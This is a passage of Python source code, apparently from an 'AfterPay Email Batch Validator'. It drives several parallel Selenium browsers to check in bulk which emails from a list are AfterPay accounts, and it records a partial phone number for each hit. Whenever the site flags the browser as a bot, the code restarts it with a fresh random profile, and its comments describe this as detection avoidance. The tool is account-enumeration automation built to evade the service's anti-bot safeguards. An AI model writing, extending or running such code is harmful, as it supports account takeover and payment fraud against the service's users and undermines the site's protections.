                            logger.error(f"🤖 Browser {browser_id} DETECTED! Forcing immediate restart: {bde}")
                            try:
                                # Capture old pid if possible
                                old_pid = None
                                try:
                                    svc = getattr(validator, 'service', None)
                                    proc = getattr(svc, 'process', None) if svc else None
                                    old_pid = getattr(proc, 'pid', None) if proc else None
                                except Exception:
                                    old_pid = None
                                # Unregister the old pid from tracking
                                try:
                                    if old_pid:
                                        with self._pid_lock:
                                            self.browser_pids.pop(browser_id, None)
                                except Exception:
                                    pass
                                validator.close()
                                time.sleep(1)  # Quick restart
                            except Exception:
                                pass
                            
                            # Notify restart callback for GUI
                            if callable(self.restart_callback):
                                try:
                                    self.restart_callback(browser_id, attempts + 1, f"Bot detected: {str(bde)}", old_pid)
                                except Exception:
                                    pass
                            
                            # Null out the validator so we don't reuse the closed driver
                            validator = None
                            attempts += 1
                            
                            if attempts > max_retries:
                                logger.error(f"❌ Browser {browser_id} max retries exceeded for {email} after detection")
                                result = {
                                    'email': email,
                                    'valid': False,
                                    'final_url': f'DETECTION_ERROR: {str(bde)}',
                                    'error': f'Browser detected after {max_retries} retries',
                                    'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
                                    'phone_ending': None,
                                    'display': f"❌ INVALID - {email}"
                                    ,'display': f"❌ INVALID - {email}"
                                }
                                break
                                
                            # Create fresh validator with random profile IMMEDIATELY
                            try:
                                logger.debug(f"🔄 Browser {browser_id} creating FRESH validator after detection")
                                validator = AfterPayBatchValidator(headless=self.headless, random_profile=True, window_position=window_position)
                                # If created, register pid
                                try:
                                    svc = getattr(validator, 'service', None)
                                    proc = getattr(svc, 'process', None) if svc else None
                                    new_pid = getattr(proc, 'pid', None) if proc else None
                                    if new_pid:
                                        with self._pid_lock:
                                            self.browser_pids[browser_id] = new_pid
                                        logger.debug(f"🔎 Registered Browser {browser_id} PID: {new_pid}")
                                except Exception:
                                    pass
                                logger.debug(f"✅ Browser {browser_id} successfully restarted after detection (attempt {attempts})")
                                continue  # Retry immediately with fresh browser
                            except Exception as restart_e:
                                logger.error(f"❌ Browser {browser_id} restart error after detection: {restart_e}")
                                validator = None
                                # Break and mark as failed if can't restart
                                result = {
                                    'email': email,
                                    'valid': False,
                                    'final_url': f'RESTART_ERROR: {str(restart_e)}',
                                    'error': f'Could not restart browser after detection',
                                    'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
                                    'phone_ending': None
                                    ,'display': f"❌ INVALID - {email}"
                                }
                                break
                        except WebDriverException as wde:
                            msg = str(wde).lower()
                            is_detection = any(m in msg for m in BOT_DETECTION_MARKERS)
                            if is_detection:
                                logger.error(f"🤖 Browser {browser_id} WebDriver DETECTION detected: {wde}")
                                # Treat as detection - force immediate restart with fresh profile
                            else:
                                logger.error(f"❌ Browser {browser_id} webdriver error: {wde}")
                            try:
                                # unregister and close
                                try:
                                    svc = getattr(validator, 'service', None)
                                    proc = getattr(svc, 'process', None) if svc else None
                                    old_pid = getattr(proc, 'pid', None) if proc else None
                                    if old_pid:
                                        with self._pid_lock:
                                            self.browser_pids.pop(browser_id, None)
                                except Exception:
                                    pass
                                validator.close()
                                time.sleep(1)  # Quick restart delay
                            except Exception:
                                pass
                            attempts += 1
                            if attempts > max_retries:
                                logger.error(f"❌ Browser {browser_id} failed after {attempts} attempts for {email}")
                                result = {
                                    'email': email,
                                    'valid': False,
                                    'final_url': f'ERROR: {str(wde)}',
                                    'error': str(wde),
                                    'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
                                    'phone_ending': None
                                    ,'display': f"❌ INVALID - {email}"
                                }
                                break
                            # ALWAYS use random profile for better detection avoidance
                            try:
                                logger.debug(f"🔄 Browser {browser_id} creating FRESH validator with random profile")
                                validator = AfterPayBatchValidator(headless=self.headless, random_profile=True, window_position=window_position)
                                try:
                                    svc = getattr(validator, 'service', None)
                                    proc = getattr(svc, 'process', None) if svc else None
                                    new_pid = getattr(proc, 'pid', None) if proc else None
                                    if new_pid:
                                        with self._pid_lock:
                                            self.browser_pids[browser_id] = new_pid
                                        logger.debug(f"🔎 Registered Browser {browser_id} PID: {new_pid}")
                                except Exception:
                                    pass
                                
                                # Notify restart callback for GUI
                                if callable(self.restart_callback):
                                    try:
                                        old_pid = None
                                        try:
                                            if validator and validator.driver:
                                                svc = getattr(validator.driver, 'service', None)
                                                proc = getattr(svc, 'process', None) if svc else None
                                                old_pid = getattr(proc, 'pid', None) if proc else None
                                        except Exception:
                                            pass
                                        reason = "WebDriver detection" if is_detection else "WebDriver error"
                                        self.restart_callback(browser_id, attempts, reason, old_pid)
                                    except Exception:
                                        pass
                                        
                                logger.debug(f"✅ Browser {browser_id} successfully restarted with fresh profile (attempt {attempts})")
                                continue
                            except Exception as restart_e:
                                logger.error(f"❌ Browser {browser_id} restart error: {restart_e}")
                                validator = None
                                continue
                        except TimeoutException:
                            logger.error(f"⏰ Timeout for: {email}")
                            result = {
                                'email': email,
                                'valid': False,
                                'final_url': 'TIMEOUT',
                                'error': 'Timeout',
                                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
                                'phone_ending': None
                                ,'display': f"❌ INVALID - {email}"
                            }
                            break
                        except Exception as e:
                            logger.error(f"❌ Error processing {email} on browser {browser_id}: {e}")
                            result = {
                                'email': email,
                                'valid': False,
                                'final_url': f'ERROR: {str(e)}',
                                'error': str(e),
                                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
                                'phone_ending': None
                                ,'display': f"❌ INVALID - {email}"
                            }
                            break

                    if requeued:
                        # If we requeued due to detection, skip result storage and do not call task_done()
                        logger.debug(f"🔁 Skipping storing result for {email} (requeued)")
                        continue
                    if result is None:
                        # Fallback in case
                        result = {
                            'email': email,
                            'valid': False,
                            'final_url': 'UNKNOWN',
                            'error': 'Unknown failure',
                            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
                            'phone_ending': None
                            ,'display': f"❌ INVALID - {email}"
                        }

                    # Store result
                    with self.results_lock:
                        self.results.append(result)
                    
                    # Save to file first
                    save_email_result(
                        result['email'],
                        'valid' if result['valid'] else 'invalid',
                        result.get('final_url'),
                        result.get('phone_ending'),
                        result.get('verification_page'),
                        result.get('display')
                    )
                    
                    # IMPORTANT: Call progress callback to update GUI (including invalid list)
                    if self.progress_callback:
                        try:
                            self.progress_callback(result)
                        except Exception as e:
                            logger.warning(f"⚠️ Error calling progress callback: {e}")
                    
                    logger.debug(f"✅ Browser {browser_id} completed: {email} -> {'VALID' if result['valid'] else 'INVALID'}")
                except Exception as e:
                    logger.error(f"❌ Browser {browser_id} error processing {email}: {e}")
                    # If we failed at outer level, continue loop to process remaining emails
                    try:
                        if not self.email_queue.empty():
                            self.email_queue.task_done()
                    except Exception:
                        pass
                    continue
            
            # Close validator and unregister pid
            try:
                try:
                    svc = getattr(validator, 'service', None)
                    proc = getattr(svc, 'process', None) if svc else None
                    old_pid = getattr(proc, 'pid', None) if proc else None
                    if old_pid:
                        with self._pid_lock:
                            self.browser_pids.pop(browser_id, None)
                except Exception:
                    pass
                if validator:
                    logger.debug(f"🔒 Closing browser {browser_id}...")
                    validator.close()
                    logger.debug(f"✅ Browser {browser_id} closed successfully")
            except Exception as e:
                logger.warning(f"⚠️ Error closing browser {browser_id}: {e}")
            logger.debug(f"🏁 Browser {browser_id} finished")
            
        except Exception as e:
            logger.error(f"❌ Browser {browser_id} failed to start: {e}")
    
    def process_emails(self, emails):
        """Process list of emails with multiple browsers"""
        if not emails:
            logger.error("❌ No emails to process!")
            return
        
        # Before starting, cleanup orphan drivers from previous runs
        try:
            self.cleanup_orphan_drivers()
        except Exception:
            pass
        # Add emails to queue
        for email in emails:
            self.email_queue.put(email)
        
        logger.info(f"🚀 Starting batch validation with {self.num_browsers} browsers...")
        logger.info(f"📊 Total emails to process: {len(emails)}")
        
        start_time = time.time()
        
        # Start browser threads
        threads = []
        screen_width = 1920  # Asumsi resolusi standar
        screen_height = 1080
        window_width = 500
        window_height = 500
        
        # Hitung posisi grid (misal 3 kolom)
        cols = 3
        
        for i in range(min(self.num_browsers, len(emails))):
            browser_id = i + 1
            
            # Hitung posisi x, y agar rapi
            row = i // cols
            col = i % cols
            pos_x = col * window_width
            pos_y = row * window_height
            
            # Pastikan tidak keluar layar (opsional)
            if pos_x > screen_width: pos_x = 0
            if pos_y > screen_height: pos_y = 0
            
            thread = threading.Thread(target=self.browser_worker, args=(browser_id, (pos_x, pos_y)))
            thread.start()
            threads.append(thread)
            # Stagger browser starts to reduce simultaneous resource spike
            try:
                import random
                delay = self.stagger_between_browsers + random.uniform(0, 0.6)
            except Exception:
                delay = self.stagger_between_browsers
            time.sleep(delay)
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # Calculate stats
        valid_count = sum(1 for r in self.results if r['valid'])
        invalid_count = len(self.results) - valid_count
        emails_per_minute = (len(self.results) / total_time) * 60 if total_time > 0 else 0
        
        # Print results
        print("\n" + "="*60)
        print("📋 BATCH VALIDATION RESULTS")
        print("="*60)
        print(f"⏰ Total time: {total_time:.1f} seconds")
        print(f"📊 Total emails: {len(self.results)}")
        print(f"✅ Valid emails: {valid_count}")
        print(f"❌ Invalid emails: {invalid_count}")
        print(f"⚡ Speed: {emails_per_minute:.1f} emails/minute")
        print(f"💾 Results saved to: valid.txt & invalid.txt")
        print("="*60)
        # Call summary callback for GUI integration if provided
        summary = {
            'total_time': total_time,
            'total_emails': len(self.results),
            'valid_count': valid_count,
            'invalid_count': invalid_count,
            'emails_per_minute': emails_per_minute
        }
        if self.summary_callback:
            try:
                self.summary_callback(summary)
            except Exception:
                pass
        return summary

    def stop(self):
        """Set stop flag to signal worker threads to stop and cleanup all browsers"""
        logger.info("🛑 Stop requested - signaling all workers to stop...")
        self._stop_event.set()
        
        # Give threads a moment to detect stop flag and start cleanup
        time.sleep(0.5)
        
        # Force cleanup of any remaining browser PIDs
        try:
            with self._pid_lock:
                pids_to_kill = list(self.browser_pids.values())
            
            if pids_to_kill:
                logger.info(f"🧹 Force cleanup of {len(pids_to_kill)} browser processes...")
                for pid in pids_to_kill:
                    if pid:
                        try:
                            self._kill_pid(pid)
                            logger.debug(f"✅ Killed browser PID: {pid}")
                        except Exception as e:
                            logger.warning(f"⚠️ Could not kill PID {pid}: {e}")
                
                # Clear the registry
                with self._pid_lock:
                    self.browser_pids.clear()
                    
                logger.info("✅ All browsers stopped and cleaned up")
        except Exception as e:
            logger.warning(f"⚠️ Error during stop cleanup: {e}")

    def pause(self):
        """Pause processing (workers will wait between jobs)"""
        self._pause_event.set()

    def resume(self):
        """Resume processing after pause"""
        self._pause_event.clear()

def main():
    """Main function"""
    print("🚀 AfterPay Email Batch Validator")
    print("=" * 50)
    
    # Load emails from file
    processor = AfterPayBatchProcessor(num_browsers=3, headless=False)
    emails = processor.load_emails_from_file('list.txt')
    
    if not emails:
        print("❌ No emails found in list.txt!")
        print("📝 Please create list.txt with one email per line")
        return
    
    print(f"📋 Found {len(emails)} emails to validate")
    print(f"🖥️ Window size: 500x500")
    print(f"🌐 Browsers: 3 parallel")
    
    # Ask for confirmation
    confirm = input("\n🚀 Start batch validation? (y/n): ").strip().lower()
    if confirm != 'y':
        print("❌ Cancelled")
        return
    
    # Process emails
    processor.process_emails(emails)

if __name__ == "__main__":
    try:
        import multiprocessing
        if getattr(sys, 'frozen', False):
            multiprocessing.freeze_support()
    except Exception:
        pass
    main()